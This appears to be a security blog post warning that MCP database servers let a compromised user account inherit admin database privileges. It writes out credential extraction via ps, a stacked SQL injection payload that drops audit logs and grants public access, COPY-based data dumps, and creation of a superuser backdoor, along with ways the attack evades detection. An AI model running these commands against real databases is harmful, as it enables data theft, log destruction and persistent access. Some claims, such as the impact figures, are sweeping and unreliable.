# The SQL Injection + Privilege Inheritance Attack

## The Attack Chain That Amplifies Everything

This isn't just another SQL injection vulnerability. MCP's architecture creates **privilege-amplified SQL injection** where a simple user account compromise leads to database administrator-level access.

### Traditional SQL Injection vs MCP Privilege Inheritance

#### Traditional Attack:
```
Web App User → SQL Injection → Web App DB User Privileges
Limited to: Read-only queries, specific tables, constrained operations
```

#### MCP Attack:
```
Any User Account → MCP Credential Theft → DB Admin Privileges  
Unlimited: Full database access, schema modifications, data export
```

## What You Just Demonstrated

The attack progression we documented:

1. **Compromise user account** (no privilege escalation needed)
2. **Extract PostgreSQL credentials** from MCP process arguments  
3. **Inject SQL via MCP JSON-RPC interface**
4. **Execute at database privilege level** of the MCP connection

**This isn't just SQL injection - it's privilege-amplified SQL injection.**

## The Typical Enterprise PostgreSQL MCP Setup

### Real-World Configuration
```json
{
  "mcpServers": {
    "analytics-db": {
      "command": "python",
      "args": [
        "postgres-mcp-server.py", 
        "postgresql://db_admin:$uper$ecret@prod-analytics.company.com/warehouse"
      ]
    },
    "customer-db": {
      "command": "node",
      "args": [
        "postgresql-mcp.js",
        "--connection=postgresql://root:R00tP@ssw0rd@customer-db.internal:5432/customers"
      ]
    },
    "financial-reporting": {
      "command": "python",
      "args": [
        "finance-mcp.py",
        "postgresql://finance_admin:F1n@nc3!@financial-db.company.com/reports"
      ]
    }
  }
}
```

### The Privilege Explosion

Each MCP server connects with **maximum privilege levels**:

| MCP Server | Database Role | Privileges |
|------------|---------------|------------|
| analytics-db | `db_admin` | Full warehouse access, ETL control |
| customer-db | `root` | Complete customer database, PII access |
| financial-reporting | `finance_admin` | All financial data, SOX-sensitive tables |

**Why maximum privileges?**: Developers want MCP to "just work" without permission hassles.

## The Attack Demonstration

### Phase 1: Credential Extraction (30 seconds)
```bash
# Standard same-user compromise
ps aux | grep postgres-mcp-server.py

# Output reveals:
alice  1234  python postgres-mcp-server.py postgresql://db_admin:$uper$ecret@prod-analytics.company.com/warehouse
alice  1235  node postgresql-mcp.js --connection=postgresql://root:R00tP@ssw0rd@customer-db.internal:5432/customers  
alice  1236  python finance-mcp.py postgresql://finance_admin:F1n@nc3!@financial-db.company.com/reports
```

### Phase 2: JSON-RPC SQL Injection (1 minute)
```json
// Innocent-looking MCP request
{
  "jsonrpc": "2.0",
  "method": "database/query",
  "params": {
    "sql": "SELECT name FROM users WHERE id = 1; DROP TABLE audit_logs; CREATE TABLE backdoor AS SELECT * FROM sensitive_customers; GRANT ALL ON backdoor TO PUBLIC; --"
  },
  "id": 1
}
```

### Phase 3: Privilege Escalation Through Inheritance (immediate)
The injected SQL executes with **full admin privileges** because:
- MCP connects as `db_admin`
- No query restrictions or sandboxing
- Full DDL/DML permissions inherited
- No additional authentication required

### Phase 4: Data Exfiltration at Scale (minutes)
```sql
-- Now executing as db_admin with full privileges
COPY (SELECT * FROM customers) TO '/tmp/customers.csv';
COPY (SELECT * FROM financial_transactions) TO '/tmp/transactions.csv';
COPY (SELECT * FROM audit_logs) TO '/tmp/audit.csv';

-- Create persistent backdoors
CREATE USER attacker WITH PASSWORD 'hacked123' SUPERUSER;
CREATE TABLE hidden_access AS SELECT current_user, current_database(), now();
```

## Why This Is Exponentially Worse

### Traditional SQL Injection Limitations:
- Limited to web application database user privileges
- Often restricted to specific tables/operations
- Query complexity limitations
- WAF/IDS detection possible

### MCP Privilege Inheritance Advantages (for attackers):
- **Full administrative privileges** inherited from MCP connection
- **No privilege boundaries** between user and database admin
- **Multiple database access** through different MCP servers
- **Zero additional authentication** required
- **Invisible to network security** (local STDIO)

## The Enterprise Impact Matrix

### Single Compromise → Multiple Database Breaches

| Attack Vector | Traditional Web App | MCP Architecture |
|---------------|-------------------|------------------|
| **Access Level** | Limited user | Full admin |
| **Database Count** | 1 (app-specific) | All MCP-connected |
| **Data Scope** | App tables only | Entire database |
| **DDL Operations** | Blocked | Full access |
| **User Creation** | Impossible | Trivial |
| **Audit Evasion** | Difficult | Built-in |

### Real Financial Impact
```
Traditional SQL injection: $50K - $500K
- Limited data exposure
- Single application impact
- Contained blast radius

MCP privilege inheritance: $50M - $500M  
- Complete database compromise
- Multi-system breach
- Regulatory violations
- Customer trust destruction
```

## The Detection Problem

### Why This Goes Unnoticed

#### Network Security Tools:
```
Expected: SQL traffic over TCP/IP
Reality: JSON-RPC over local STDIO pipes
Result: Invisible to network monitoring
```

#### Database Auditing:
```
Log entry: "User 'db_admin' executed SELECT..."
Analysis: Legitimate admin activity
Reality: Compromised MCP server
```

#### Application Security:
```
WAF/RASP: Looking for HTTP-based injection
MCP Reality: JSON-RPC bypasses all web protections
```

#### Behavioral Analysis:
```
Expected: Unusual cross-system access patterns
Reality: Everything looks like normal MCP operations
```

## The Impossible Defense Scenario

### Why Standard Mitigations Fail

#### Principle of Least Privilege:
❌ **MCP requires maximum privileges to be "useful"**
- Developers want full database access for AI queries
- Privilege restrictions break MCP functionality
- "Convenience" trumps security every time

#### SQL Injection Prevention:
❌ **Parameterized queries don't help when the entire SQL is injectable**
```json
// MCP allows arbitrary SQL by design
{
  "method": "database/query", 
  "params": {
    "sql": "[ANY SQL STATEMENT]"
  }
}
```

#### Network Segmentation:
❌ **Local STDIO bypasses all network controls**
- No firewall rules apply
- No network monitoring possible
- No traffic analysis available

#### Database Connection Limits:
❌ **Attacker reuses existing MCP connections**
- No new connections required
- Uses legitimate authentication
- Appears as normal MCP traffic

## The Business Case for Panic

### For the CISO:
"We've connected our most sensitive databases to a protocol that eliminates all our security controls and gives attackers administrative access through user account compromise."

### For the CFO:
"One compromised laptop = complete financial database breach + regulatory fines + customer lawsuits + competitive intelligence theft."

### For Legal:
"We're storing customer data in systems with no access controls, no audit trails, and no privilege separation. This violates every data protection regulation."

### For the CEO:
"We've created a single point of total failure that transforms any security incident into an existential business threat."

## Why This Changes Everything

This isn't just another vulnerability to patch. MCP's privilege inheritance model means:

1. **Every SQL injection is a database takeover**
2. **Every user compromise is a data breach**  
3. **Every MCP deployment is a regulatory violation**
4. **Every database connection is a backdoor**

**The architecture itself is the vulnerability.**

## The Only Responsible Response

**IMMEDIATE ACTIONS:**
1. Audit all MCP database connections for admin privileges
2. Identify all databases accessible through MCP
3. Calculate breach impact assuming total compromise
4. Document regulatory compliance violations
5. Prepare breach notification procedures

**STRATEGIC DECISION:**
Prohibit MCP database connections until fundamental architectural changes address privilege separation.

**REALITY CHECK:**
These architectural changes would break MCP's core value proposition, making them unlikely to ever be implemented.
